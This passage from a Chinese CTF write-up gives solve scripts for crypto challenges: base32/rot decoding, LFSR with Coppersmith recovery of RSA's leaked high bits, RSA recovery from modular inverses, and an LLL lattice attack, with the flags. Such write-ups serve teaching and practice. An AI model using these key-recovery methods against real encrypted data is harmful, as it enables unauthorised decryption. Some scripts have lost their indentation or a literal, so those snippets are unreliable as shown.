class="line"><span class="comment">#666c61677b36323462306666352d326436642d313165632d623438622d6463613930343938613264627d</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;</code></p><p>​    </p><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><blockquote><p>31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d</p></blockquote><p>先转hex得到 <code>13+5=???----zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code>，</p><p><code>zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code> 根据无数字1和等号特征，猜测是转小写的base32；</p><p>转回大写，由前面提示 <code>13+5</code>，rot13+base32得到 <code>fladå.Ù..Å.Í.Õ.Á.ÌÅ....Èå.ÈäÝ...Õ..Éþ</code> 出现flag头；</p><p>由于 <code>base32(&#39;flag&#123;&#39;)=MZWGCZ33</code>，数字为rot5，密文还原为 <code>MZWGCZ33HFSTMZLGGFQTGZRVMYYGKMZRMNQWIZBSHFRTEOJXMJSWMNLBMQZH2===</code>，</p><p>base32 解码得 <code>flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;</code>。</p><p><strong>FLAG:</strong> <code>flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;</code></p><p>​    </p><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><blockquote><p>杂七杂八密码的混合体</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    newbit = (status &lt;&lt; <span class="number">1</span>) &amp; (<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    i=(status&amp;mask)&amp;(<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    newbit^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (newbit,lastbit)</span><br><span class="line"></span><br><span class="line">status=<span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">b&quot;flag&#123;*************&#125;&quot;</span></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">binp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">c = (<span class="built_in">pow</span>(num, e, n))</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;enc2&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(n)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;enc&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">760</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(binp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">chr</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>LFSR + RSA高位p泄露攻击。</p><p>先模拟LFSR求出760组 <code>out</code> 01值，结合<code>enc</code>文件中01密文，异或还原 $p$ 的高760二进制位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    newbit = (status &lt;&lt; <span class="number">1</span>) &amp; (<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    i=(status&amp;mask)&amp;(<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    newbit^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (newbit,lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">status = <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#xx27;</span>))</span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line">pp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">760</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">pp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">pp = <span class="built_in">int</span>(pp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(pp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#6064523798049644277925701126806650606472211004362096137261922023539261533931159712229993784486900304494092698035668254711607734547323493716579247168129613825017402250081444943555723771998431425098683590600454956058175183022718975</span></span><br></pre></td></tr></table></figure><p>利用coppersmith攻击方法，进行已知 $p$ 高位攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">20929902170717676951934620006433003604730678640645007075637305655990838672444304031857412581445836654784941618387885677741424195646067710979291690749949226354601059943673546892769474380805413381477209725509187761202889007557157174009816759858206190915193870770303140668513899480840368042056977078850633645939996806974754076338446182094408033833859119883893893710390855924917625801146138452249766835457952331243832878453385608344187234621288871394907683956060567710199168220435234555727645472494418988488158424284566395402382371954247354264148359024995803494283148151292240772247688313806712633140618802681063347059301</span></span><br><span class="line">p4 = <span class="number">6020793003600505515657431119157212393365966944447518390323900168965824649782228689680274668164250924439790546808885513956693311045291390596152861670602514965058376230082977010070282487901715757886308848763512028412503942684262007</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>+<span class="built_in">str</span>(n//p))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209</span></span><br><span class="line"><span class="comment">#q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389</span></span><br></pre></td></tr></table></figure><p>最后常规RSA解 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209</span></span><br><span class="line">q = <span class="number">117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389</span></span><br><span class="line">n = p * q</span><br><span class="line">fn = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12381638589055841139447839302795029653843309313978198727914736718245700098003130043532117734105184556347388175236916768083364314767482249333410320774565764577094924964983543424785959666191716662886118558538365503080964047183533841342232120086245448689762948846598689811062301086591078119426971029385906936610191899748366808606594184238261341160458933596780268681004577561284530512291876043524269456261191856680575840859843145591670082313114482813697656520320677074240863479192424768989294287655231041605257414144367688426659163486702611196512549549115716697786311455783534600599360245502989232358699920442842821956230</span></span><br><span class="line">d = gmpy2.invert(e, fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;th1s_ls_4_eZ_quEST1on&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;th1s_ls_4_eZ_quEST1on&#125;</code></p><p>​    </p><h3 id="NumberGame"><a href="#NumberGame" class="headerlink" title="NumberGame"></a>NumberGame</h3><blockquote><p>数字的游戏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e=65537</span><br><span class="line">(p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span><br><span class="line">c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763</span><br><span class="line">invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531</span><br><span class="line">invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507</span><br></pre></td></tr></table></figure></blockquote><p>给出 $(p-1)(q-1),x=\text{inv}(p,q),y=\text{inv}(q,p),e,c$。</p><p>详细推导思路可参考 <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>。</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span></span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span></span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    fn = <span class="number">15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = gmpy2.invert(e,fn)</span><br><span class="line">    pprime = <span class="number">63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531</span></span><br><span class="line">    qprime = <span class="number">61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span class="number">13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#b&#x27;flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;</code></p><p>​    </p><h3 id="FillTheBlank"><a href="#FillTheBlank" class="headerlink" title="FillTheBlank"></a>FillTheBlank</h3><blockquote><p>推公式？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">a = <span class="number">16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723</span></span><br><span class="line">b = <span class="string">&quot;**********&quot;</span></span><br><span class="line">d = <span class="number">1004034638166310792730607806775703553124564601554345421260673</span></span><br><span class="line">flag=<span class="string">&quot;flag&#123;*************&#125;&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">z = <span class="string">&quot;**********&quot;</span></span><br><span class="line"></span><br><span class="line">rb = gmpy2.invert(b, p)  <span class="comment">#p应为a</span></span><br><span class="line">rd = gmpy2.invert(d, p)  <span class="comment">#p应为a</span></span><br><span class="line"></span><br><span class="line">x = rb*rd</span><br><span class="line">c = (m + z * rb * d % a)%a</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(x==<span class="number">6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478</span>)</span><br><span class="line"><span class="keyword">assert</span>(c == <span class="number">13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129</span>)</span><br><span class="line"><span class="keyword">assert</span>(log(d)/log(<span class="number">2</span>)&lt;=<span class="number">200</span>)</span><br><span class="line"><span class="keyword">assert</span>(log(z)/log(<span class="number">2</span>)&lt;=<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></blockquote><p>推导：</p><p>由 $rb \equiv b^{-1} \pmod a$ 和 $rd \equiv d^{-1} \pmod a$ ，有 $rb \cdot b \cdot rd \cdot d = x \cdot b \cdot d \equiv 1 \pmod a$。</p><p>故求出 $b \equiv (x \cdot d)^{-1} \pmod a$，$rb \equiv b^{-1} \pmod a$。</p><p>又 $c = (m+z \cdot rb \cdot d) \bmod a$，构造格 $L=\begin{bmatrix} 1 &amp; rb \cdot d \\ 0 &amp; a \end{bmatrix}$，利用LLL算法求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723</span></span><br><span class="line">d = <span class="number">1004034638166310792730607806775703553124564601554345421260673</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478</span></span><br><span class="line">c = <span class="number">13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">b = gmpy2.invert(x*d,a)</span><br><span class="line">rb = gmpy2.invert(b,a)</span><br><span class="line">rd = gmpy2.invert(d,a)</span><br><span class="line">h = rb*d%a</span><br><span class="line"></span><br><span class="line">p = a</span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = -f, -g</span><br><span class="line"><span class="comment">#print(f, g)</span></span><br><span class="line"></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span 